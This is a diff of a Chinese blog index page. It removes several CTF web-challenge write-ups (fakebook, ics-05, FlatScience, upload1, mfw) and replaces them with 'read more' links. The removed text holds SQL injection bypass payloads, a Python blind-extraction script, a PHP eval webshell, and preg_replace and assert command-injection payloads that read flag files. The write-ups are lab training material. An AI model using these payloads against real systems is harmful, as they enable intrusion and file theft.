@@ -420,97 +420,9 @@
 <h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5425&page=2" target="_blank" rel="noopener">fakebook</a></h1><p>首先dirsearch扫一遍，扫到了robors.txt，进入发现文件user.php.bak，下载，开始审计php代码。</p>
 <p>看到注册中的$blog是有正则检测的，大概像个网页的样子，使用echo出具体的正则：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>;</span><br><span class="line"><span class="comment"># /^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i</span></span><br></pre></td></tr></table></figure>
-
-<p>进入<a href="http://c.runoob.com/front-end/854" target="_blank" rel="noopener">菜鸟教程的在线工具</a>练练匹配，发现这样的格式可以匹配到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a.ab/a?s=a</span><br></pre></td></tr></table></figure>
-
-<p>进入注册页面注册，显示注册完成，并且在跳转出的页面中发现username可以交互，点击一下进入url:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:43258/view.php?no=1</span><br></pre></td></tr></table></figure>
-
-<p>试着对no=1加了一发单引号，居然引起了mysql的报错，考虑SQL注入。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=1+union+select+1+--+</span><br></pre></td></tr></table></figure>
-
-<p>提示no hack，试了试/**/与大小写绕过，成功了:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=1/**/unIon/**/Select+1,1,1,1+--+</span><br></pre></td></tr></table></figure>
-
-<p>问题是不显示结果，把前面的no=1改改，发现在前面无结果报错时，后面的第二个参数能被打印在username栏中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0/**/unIon/**/Select+1,2,3,4+--+   # username显示2</span><br></pre></td></tr></table></figure>
-
-<p>尝试查询了所有的数据库，只能发现三个：</p>
-<blockquote>
-<p>fakebook</p>
-</blockquote>
-<blockquote>
-<p>information_schema</p>
-</blockquote>
-<blockquote>
-<p>performance_schema</p>
-</blockquote>
-<p>去fakebook查查，发现里面只有自己注册的账号信息。</p>
-<h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>我们直接使用load_file访问文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+</span><br></pre></td></tr></table></figure>
-
-<p>发现flag就在HTML中</p>
-<h3 id="笨办法-写py练手用，实则没发现HTML中注释的flag…"><a href="#笨办法-写py练手用，实则没发现HTML中注释的flag…" class="headerlink" title="笨办法(写py练手用，实则没发现HTML中注释的flag…..)"></a>笨办法(写py练手用，实则没发现HTML中注释的flag…..)</h3><p>因此flag大概不在数据库中了，也许需要我们通过SQL注入显示系统文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+</span><br></pre></td></tr></table></figure>
-
-<p>这样子居然报no hack的警告了，发现有关于hex的拦截，/**/与大小写绕过均不可行。<br>问题不大，使用另外一种构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0/**/unIon/**/Select+1,ascii(substr((load_file(&quot;/var/www/html/flag.php&quot;)) from 1 for 1)),3,4+--+</span><br></pre></td></tr></table></figure>
-
-<p>只能一个一个显示，这里用用python脚本<del>(练个习)</del>：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">r'http://220.249.52.133:43258/view.php?no=0/**/unIon/**/Select+1,ascii(substr((load_file("/var/www/html/flag.php"))'</span> + <span class="string">'from %d for 1)),3,4+--+'</span>%i</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    match = re.search(<span class="string">r"&lt;td&gt;\s*(\d+)\s*&lt;/td&gt;"</span>, res.text)</span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    asc = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> asc == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += chr(int(asc))</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
-
-<h3 id="WP的办法"><a href="#WP的办法" class="headerlink" title="WP的办法"></a>WP的办法</h3><p>查到表名之后，我们决定沿着数据库继续走下去，看看我们提交的数据被转储成了什么样子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?no=0/**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()+--+</span><br><span class="line"># users</span><br><span class="line">?no=0/**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()  and table_name=&quot;users&quot;+--+</span><br><span class="line"># no,username,passwd,data	</span><br><span class="line">?no=0/**/union/**/select 1,group_concat(data),3,4 from users+--+</span><br><span class="line"># O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:18:&quot;https://a.ab/a?s=a&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>至此，我们发现我们的信息被反序列化存在data字段中了，同时看到网页底部关于SQL的报错：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67</span><br></pre></td></tr></table></figure>
-
-<p>回到user.php.bak中，可以看到这个方法具体是干什么的，在data反序列化之后，里面的blog被用去解析，<code>这里我们可以使用http(s)以外的协议来实现访问服务器内的文件</code></p>
-<h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br><span class="line">=&gt;</span><br><span class="line">?no=0/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;+--+</span><br></pre></td></tr></table></figure>
-
-<p>同样的，在HTML注释(这次是在底部的HTML)中发现了flag。</p>
-<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4919&page=2" target="_blank" rel="noopener">ics-05</a></h1><p>首先进行一波dirsearch，什么也没看到，嗯……进入设备维护中心看看扒。</p>
-<p>发现全网页只有左上角的”云平台设备维护中心”可以点，进入了一个奇怪的url:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?page=index</span><br></pre></td></tr></table></figure>
-
-<p>尝试随便打点什么，发现当输入纯数字与字母时，在底下可以打印<del>(复读)</del>出相应的数字与字母。</p>
-<p>打开burp抓包之后使用fuzz字节注入，看看哪些字符是允许的。</p>
-<p>结果是没有发现异常，所有除 字母 数字以外的字符均不被允许。</p>
-<p>尝试一下SQL注入，果然也不行。</p>
-<p>这时，写了index.php，居然反悔了Ok，开始怀疑文件包含漏洞。</p>
-<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>使用php://filter/read=convert.base64-encode/recource=[payload]来写入file参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-
-<p>我们即看到了index.php的源码，接下来进行代码审计。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page = $_GET[$page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $page;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos($page, <span class="string">'input'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($page, <span class="string">'ta:text'</span>) &amp;&amp; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($page, <span class="string">'text'</span>) &amp;&amp; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($page === <span class="string">'index.php'</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Ok'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($page);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br --&gt;Welcome My Admin ! &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[$pat];</span><br><span class="line">    $replacement = $_GET[$rep];</span><br><span class="line">    $subject = $_GET[$sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看底下那段代码，需要我们使用X-Forwarded-For定向为127.0.0.1，且这里有一个字符串匹配函数。</p>
-<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>php的字符串匹配有个严重的问题：</p>
-<blockquote>
-<p>当匹配的模式(pattern)包含’\e’时，如果匹配的字符串(subject)与模式(pattern)匹配，则执行$replacement字符串代码</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pat=/a/e&amp;rep=system(&apos;ls&apos;)&amp;sub=&quot;a&quot;</span><br><span class="line">pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir%26%26ls&apos;)</span><br><span class="line">pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir/flag%26%26cat+flag.php&apos;)&amp;sub=&quot;a&quot;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>在php的system()命令中，可以在字符串中输入多个命令，使用<code>&amp;&amp; =&gt; %26%26</code>拼接。</p>
-</blockquote>
-<h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4809&page=2" target="_blank" rel="noopener">FlatScience</a></h1><p>首先使用dirsearch扫一遍，发现robots.txt login.php admin.php三个重要路由，进入robogs.txt康康，里面就是login.php和admin.php。</p>
-<p>分别进入两个路由，发现login中是任意用户，admin中仅限用户名为admin，首先从login下手看看。</p>
-<p>发现可以进行SQL注入，使用sqlmap，显示数据库为SQLite。</p>
-<p>对SQLite尝试注入，之后陷入了短暂的僵局。</p>
-<p>接着偶然间查看了下HTML，发现了?debug参数，输入url居然返回了php代码，开始审计php：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">blockquote &#123; background: #eeeeee; &#125;</span><br><span class="line">h1 &#123; border-bottom: solid black 2px; &#125;</span><br><span class="line">h2 &#123; border-bottom: solid black 1px; &#125;</span><br><span class="line">.comment &#123; color: darkgreen; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div align=right class=lastmod&gt;</span><br><span class="line">Last Modified: Fri Mar  31:33:7 UTC 1337</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">Login Page, do not try to hax here plox!&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;post&quot;&gt;</span><br><span class="line">  ID:&lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  Password:&lt;br&gt; </span><br><span class="line">  &lt;input type=&quot;text&quot; name=&quot;pw&quot;&gt;</span><br><span class="line">  &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&apos;usr&apos;]) &amp;&amp; isset($_POST[&apos;pw&apos;]))&#123;</span><br><span class="line">        $user = $_POST[&apos;usr&apos;];</span><br><span class="line">        $pass = $_POST[&apos;pw&apos;];</span><br><span class="line"></span><br><span class="line">        $db = new SQLite3(&apos;../fancy.db&apos;);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&apos;&quot;.$user.&quot;&apos; and password=&apos;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&apos;&quot;);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;Some Error occourred!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($row[&apos;id&apos;]))&#123;</span><br><span class="line">            setcookie(&apos;name&apos;,&apos; &apos;.$row[&apos;name&apos;], time() + 60, &apos;/&apos;);</span><br><span class="line">            header(&quot;Location: /&quot;);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;debug&apos;]))</span><br><span class="line">highlight_file(&apos;login.php&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</span><br><span class="line">&lt;hr noshade&gt;</span><br><span class="line">&lt;address&gt;Flux Horst (Flux dot Horst at rub dot flux)&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
-
-<p>我们发现了变量在SQL语句中的引入方式与password的加密方式，并且发现注入数据(name)的结果会存入cookie中。</p>
-<h2 id="SQLite表"><a href="#SQLite表" class="headerlink" title="SQLite表"></a><a href="https://blog.csdn.net/jingcheng345413/article/details/70155254" target="_blank" rel="noopener">SQLite表</a></h2><p>接着尝试注入数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">usr=1&apos; union select 1,sql from sqlite_master where type=&apos;table&apos; and name=&apos;Users&apos;--&amp;pw=1</span><br><span class="line">=&gt; </span><br><span class="line">CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29</span><br><span class="line">=&gt;</span><br><span class="line">CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</span><br><span class="line"></span><br><span class="line">usr=1&apos; union select 1,hint from Users (where id &gt; 1[,2,...]) --&amp;pw=1</span><br><span class="line">=&gt;</span><br><span class="line">+my+fav+word+in+my+fav+paper%3F%21</span><br><span class="line">+my+love+is%E2%80%A6%3F</span><br><span class="line">+the+password+is+password</span><br></pre></td></tr></table></figure>
-
-<p>最后发现，要求将所有的论文下载下来，挨个遍历单词，将所有单词按照<code>sha1(word + &quot;Salz!&quot;)</code>加密，挨个注入admin.php。</p>
-<p><del>最后的脚本和解题我没看，我只知道单词是ThinJerboa，这里出题个人认为实在是太无趣了…</del></p>
-
+    
+    <a class="article-more-a" href="/2020/10/15/ctf/ctf%E7%AC%94%E8%AE%B0-06/#more">more >></a>
+    
     
 
     
@@ -606,34 +518,9 @@
 <p>接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。</p>
 <p>使用sqlmap，搞定。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump</span><br></pre></td></tr></table></figure>
-
-<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4822&page=1" target="_blank" rel="noopener">upload1</a></h1><p>看似为webshell上传，上传一个php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"awa"</span>]); <span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>
-
-<p>提示需要使用图片上传，考虑是前端防护，直接打开浏览器调试把”上传”按钮的disable样式去掉，得以上传。</p>
-<p>之后使用菜刀连接，地址为网页返回的上传文件路径，后面的口令填上传的变量名 ($_POST[“awa”]则为awa)</p>
-<p>成功注入后即可随心所欲访问文件，当然flag也在里面。</p>
-<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002&page=1" target="_blank" rel="noopener">mfw</a></h1><p>首先使用dirsearch进行目录爆破，哦吼，发现一堆.git文件，考虑git泄露。</p>
-<p>使用githacker进行攻击，githacker的具体食用方法见<code>ctf笔记-08</code>中。(原本此处用的是githack，但是其由于不能恢复版本，不推荐使用)</p>
-<p>查看版本，确定只有一个版本之后，开始审计这个版本的代码。</p>
-<p>首先查看flag.php，嗯，在这个git的版本中没东西，看起来需要我们访问现有的flag.php才行。</p>
-<p>开始审计index.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>需要想办法绕过两个’.’，</p>
-<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>这道题的漏洞出在assert()中，因为<strong><em>assert()可以执行字符串</em></strong>。</p>
-<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><ol>
-<li><pre><code class="payload">%27.system(&quot;cat%20./templates/flag.php&quot;).%27
-=&gt;
-&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;
-=&gt;
-file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;.php&apos;)
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```payload</span><br><span class="line">   %27)%20or%20phpinfo();%23   # &apos;#&apos;号一定要进行url编码，否则会被忽略掉！</span><br><span class="line">   =&gt;</span><br><span class="line">   &apos;) or phpinfo();#&apos;</span><br><span class="line">   =&gt;</span><br><span class="line">   file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ol>
-<p><del>flag在HTML的注释中</del></p>
-
+    
+    <a class="article-more-a" href="/2020/10/14/ctf/ctf%E7%AC%94%E8%AE%B0-05/#more">more >></a>
+    
     
 
     
@@ -1467,14 +1354,6 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">node</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">《了不起的Node JS 将JavaScript进行到底》</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">容斥</a>
               </li>
              
@@ -1491,19 +1370,11 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">链表</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1515,6 +1386,14 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">链表</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">分治法</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">模拟</a>
               </li>
              
@@ -1523,11 +1402,19 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">暴力</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">暴力</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">node</a>
+              </li>
+             
+              <li class="article-tag-list-item">
